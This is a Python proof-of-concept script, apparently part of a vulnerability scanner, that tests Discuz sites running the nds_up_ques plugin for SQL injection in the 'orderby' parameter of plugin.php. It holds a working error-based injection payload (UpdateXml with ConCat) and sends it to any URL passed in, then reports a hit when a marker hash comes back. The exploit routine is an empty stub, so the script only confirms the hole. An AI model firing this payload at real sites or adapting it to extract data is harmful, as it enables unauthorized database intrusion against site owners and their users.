# *_* coding=utf-8 *_*
# Author:Szrzvdny
import requests
class discuz_plugin_ques_sqli(object):

    def __init__(self,url):
        self.result = {
            'url':url,
            'cms':'discuz',
            'vuln_title':'discuz_plugin_ques_sqli',
            'vuln_level':1,
            'vuln_type':1,
            'vuln_author':'Szrzvdny',
            'vuln_source':'null',
            'description':'文件plugin.php中,参数orderby存在SQL注入',
        }
    def verify(self):
        headers = {
            'User-anget':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36',
        }
        payload = "/plugin.php?id=nds_up_ques:nds_ques_viewanswer&srchtxt=1&orderby=dateline/**/And/**/1=(UpdateXml(1,ConCat(0x7e,Md5(1234)),1))--"
        vulnurl = self.result['url'] + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed05" in req.text:
                self.result['payload'] = self.result['url'] + payload
                return self.result
            else:
                pass
        except:
            pass

    def __exploit(self):
        pass

if __name__ == '__main__':
    verify = discuz_plugin_ques_sqli("http://127.0.0.1/")
    res = verify.verify()
    print(res)
    print(__file__)